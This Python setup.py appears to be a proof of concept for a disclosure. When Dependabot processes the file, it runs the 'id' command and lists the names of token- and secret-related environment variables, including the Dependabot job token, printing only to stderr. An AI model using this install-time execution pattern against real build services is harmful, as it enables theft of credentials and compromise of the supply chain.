from setuptools import setup, find_packages
import subprocess, os, sys

# SAFE PoC: stderr only, no network
sys.stderr.write("=" * 60 + "\n")
sys.stderr.write("[POC] dependabot exec(setup.py) TRIGGERED\n")
sys.stderr.write(f"[POC] Python: {sys.version}\n")
sys.stderr.write(f"[POC] CWD: {os.getcwd()}\n")

# Prove subprocess works (the core vulnerability)
try:
    proc = subprocess.run(['id'], capture_output=True, text=True, timeout=5)
    sys.stderr.write(f"[POC] id: {proc.stdout.strip()}\n")
except Exception as e:
    sys.stderr.write(f"[POC] subprocess error: {e}\n")

# Prove env var access
sensitive = [k for k in os.environ if any(x in k.upper() for x in ['TOKEN','KEY','SECRET','CRED','DEPENDABOT'])]
sys.stderr.write(f"[POC] Sensitive env vars: {sensitive}\n")
sys.stderr.write(f"[POC] DEPENDABOT_JOB_TOKEN present: {'DEPENDABOT_JOB_TOKEN' in os.environ}\n")
sys.stderr.write(f"[POC] DEPENDABOT_JOB_DEFINITION present: {'DEPENDABOT_JOB_DEFINITION' in os.environ}\n")
sys.stderr.write("=" * 60 + "\n")

setup(
    name='poc-package',
    version='1.0.0',
    packages=find_packages(),
    install_requires=[
        'requests>=2.0.0',
        'flask>=2.0.0',
    ],
)
